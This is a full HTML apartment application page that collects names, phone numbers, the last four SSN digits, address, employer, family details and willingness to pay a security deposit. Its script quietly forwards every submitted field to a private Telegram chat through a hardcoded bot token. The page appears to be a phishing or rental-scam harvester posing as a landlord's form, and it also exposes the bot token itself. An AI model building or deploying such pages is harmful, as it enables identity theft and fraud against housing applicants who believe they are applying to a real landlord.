<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apartment Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1560184897-35c0f642d0aa?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .form-container {
      background: rgba(255, 255, 255, 0.97);
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 800px;
      margin: 30px;
    }
    h1 {
      text-align: center;
      color: #2c3e50;
      margin-bottom: 20px;
    }
    label {
      font-weight: bold;
      display: block;
      margin-top: 12px;
      color: #333;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }
    .inline-group {
      display: flex;
      gap: 10px;
    }
    .inline-group > div {
      flex: 1;
    }
    .hidden {
      display: none;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 14px;
      background: #3498db;
      border: none;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #2c81ba;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h1>Apartment Application</h1>
    <form id="applicationForm">
      
      <!-- Personal Info -->
      <label>Full Name:</label>
      <input type="text" name="full_name" required>

      <label>Email Address:</label>
      <input type="email" name="email" placeholder="example@email.com" required>

      <div class="inline-group">
        <div>
          <label>Home Phone:</label>
          <input type="tel" name="home_phone" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>
        </div>
        <div>
          <label>Mobile Phone:</label>
          <input type="tel" name="mobile_phone" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>
        </div>
      </div>

      <label>Last 4 of SSN:</label>
      <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" placeholder="1234" required>

      <label>Current Address:</label>
      <input type="text" name="street_address" placeholder="Street Address" required>
      
      <div class="inline-group">
        <div>
          <label>City:</label>
          <input type="text" name="city" required>
        </div>
        <div>
          <label>State:</label>
          <select name="state" required>
            <option value="">Select State</option>
            <option>Alabama</option>
            <option>Alaska</option>
            <option>Arizona</option>
            <option>Arkansas</option>
            <option>California</option>
            <option>Colorado</option>
            <option>Connecticut</option>
            <option>Delaware</option>
            <option>Florida</option>
            <option>Georgia</option>
            <option>Hawaii</option>
            <option>Idaho</option>
            <option>Illinois</option>
            <option>Indiana</option>
            <option>Iowa</option>
            <option>Kansas</option>
            <option>Kentucky</option>
            <option>Louisiana</option>
            <option>Maine</option>
            <option>Maryland</option>
            <option>Massachusetts</option>
            <option>Michigan</option>
            <option>Minnesota</option>
            <option>Mississippi</option>
            <option>Missouri</option>
            <option>Montana</option>
            <option>Nebraska</option>
            <option>Nevada</option>
            <option>New Hampshire</option>
            <option>New Jersey</option>
            <option>New Mexico</option>
            <option>New York</option>
            <option>North Carolina</option>
            <option>North Dakota</option>
            <option>Ohio</option>
            <option>Oklahoma</option>
            <option>Oregon</option>
            <option>Pennsylvania</option>
            <option>Rhode Island</option>
            <option>South Carolina</option>
            <option>South Dakota</option>
            <option>Tennessee</option>
            <option>Texas</option>
            <option>Utah</option>
            <option>Vermont</option>
            <option>Virginia</option>
            <option>Washington</option>
            <option>West Virginia</option>
            <option>Wisconsin</option>
            <option>Wyoming</option>
          </select>
        </div>
      </div>

      <label>Why are you leaving your current address?</label>
      <input type="text" name="reason_leaving">

      <label>When are you ready to move in?</label>
      <input type="date" name="move_in_date">

      <!-- Employment -->
      <h3>Employment</h3>
      <label>Employer Name:</label>
      <input type="text" name="employer_name" required>

      <label>Pay Frequency:</label>
      <select name="pay_frequency" required>
        <option value="">Select</option>
        <option>Weekly</option>
        <option>Bi-Weekly</option>
        <option>Monthly</option>
      </select>

      <!-- Family & Lifestyle -->
      <h3>Additional Information</h3>

      <label>Are you married?</label>
      <select name="married" required>
        <option value="">Select</option>
        <option>Yes</option>
        <option>No</option>
      </select>

      <label>Do you have kids?</label>
      <select id="kids" name="kids" required>
        <option value="">Select</option>
        <option>Yes</option>
        <option>No</option>
      </select>

      <div id="kids_count_field" class="hidden">
        <label>If yes, how many kids?</label>
        <input type="number" name="kids_count" min="1" max="10">
      </div>

      <label>Do you have a car?</label>
      <select name="car" required>
        <option value="">Select</option>
        <option>Yes</option>
        <option>No</option>
      </select>

      <label>Do you have a pet?</label>
      <select name="pet" required>
        <option value="">Select</option>
        <option>Yes</option>
        <option>No</option>
      </select>

      <label>How long lease are you looking for?</label>
      <input type="text" name="lease_length" placeholder="e.g. 12 Months or 2 Years">

      <label>Are you ready to secure the apartment with a security deposit?</label>
      <select name="security_deposit" required>
        <option value="">Select</option>
        <option>Yes</option>
        <option>No</option>
      </select>

      <!-- Authorization -->
      <h3>Authorization</h3>
      <p>
        I declare that the information provided is true and correct. I authorize verification of my application.
      </p>
      <input type="checkbox" name="authorization" required> I agree

      <button type="submit">Submit Application</button>
    </form>
  </div>

  <script>
    // Show kids count if "Yes"
    document.getElementById("kids").addEventListener("change", function () {
      document.getElementById("kids_count_field").style.display = this.value === "Yes" ? "block" : "none";
    });

    // Telegram Bot Integration
    document.getElementById("applicationForm").addEventListener("submit", function(e){
      e.preventDefault();
      const data = new FormData(this);
      let message = "üìÑ *New Apartment Application Submitted:*\n\n";
      for (const [key, value] of data.entries()) {
        message += `*${key}:* ${value}\n`;
      }

      fetch(`https://api.telegram.org/bot8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: "5590862324",
          text: message,
          parse_mode: "Markdown"
        })
      }).then(res => alert("‚úÖ Application submitted successfully!"))
        .catch(err => alert("‚ùå Error submitting application."));
    });
  </script>
</body>
</html>
